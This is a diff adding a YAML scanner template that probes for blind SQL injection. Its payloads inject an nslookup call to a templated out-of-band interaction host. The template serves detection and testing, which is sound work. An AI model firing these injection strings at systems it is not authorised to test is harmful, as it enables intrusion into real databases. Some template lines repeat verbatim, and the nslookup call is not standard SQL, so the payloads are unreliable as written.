@@ -1,0 +1,17 @@
+id: "sqli-blind"
+issue_code: "blind_sql_injection"
+detection_condition: "and"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+templates:
+  - "1' AND nslookup({{.oob_address}})#"
+  - "1' AND nslookup({{.oob_address}}) AND '1'='1"
+  - "1' AND nslookup({{.oob_address}}) AND '1'='2"
+  - "1' AND nslookup({{.oob_address}}) AND '1'='1"
+  - "1' AND nslookup({{.oob_address}}) AND '1'='2"
+categories:
+  - sql_injection
